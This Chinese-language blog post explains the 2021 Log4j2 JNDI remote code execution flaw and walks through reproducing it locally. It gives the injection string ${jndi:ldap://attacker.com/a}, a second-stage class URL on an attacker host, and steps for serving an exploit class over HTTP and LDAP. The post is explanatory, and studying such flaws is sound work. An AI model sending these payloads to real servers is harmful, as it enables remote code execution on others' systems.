log4j2 远程执行漏洞原理与复现

Posted on 2021-12-10 Views: Disqus:
log4j2 爆发漏洞，该漏洞通过记录某个字符串导致远程执行代码。像Steam，Apple iCloud这样的云服务以及像Minecraft这样的应用程序已经被发现容易受到攻击

影响范围

使用了 log4j2，2.0~ 2.14.1 版本的均有影响

像Steam，Apple iCloud这样的云服务以及像Minecraft这样的应用程序已经被发现容易受到攻击。

漏洞利用原理

要求

引用了 log4j2 漏洞版本的服务器

黑客服务器（ladp + http）

从该请求中注入字符串的日志语句

漏洞利用步骤

  1. 发送包含恶意字符串的请求（通过任何协议）
  2. 服务器记录请求中数据。包含恶意有效负载：（其中是攻击者控制的服务器），${jndi:ldap://attacker.com/a}
  3. 该漏洞由此有效负载触发，服务器通过“Java 命名和目录接口“（JNDI）发出请求，log4j attacker.com/a
  4. 此响应包含注入服务器进程的远程 Java 类文件（例如 ）的路径，http://second-stage.attacker.com/Exploit.class
  5. 此注入的有效负载会触发第二阶段，并允许攻击者执行任意代码。

代码实现

具体的代码见 github：zhouxinghang/log4j2-rce: log4j2 remote code execution sample (github.com)

编写攻击类

会在 mac 系统上启动计算器

开启 http 服务

将攻击类 Exploit.java 编译成 Exploit.class 文件。并在 class 目录下启动 Http 服务，用于远程下载攻击类。python3 -m http.server 8100

开启 LDAP 服务

启动 LDAPRefServer 类，监听 ladp 请求，响应远程 Java 类文件的路径，http://127.0.0.1:8100/Exploit.class。被攻击服务会执行该远程类

被攻击服务

在请求被攻击服务时候，设置 user-agent = ${jndi:ldap://127.0.0.1:1389/a}。log4j2 打印 user-agent 值就会执行远程类。
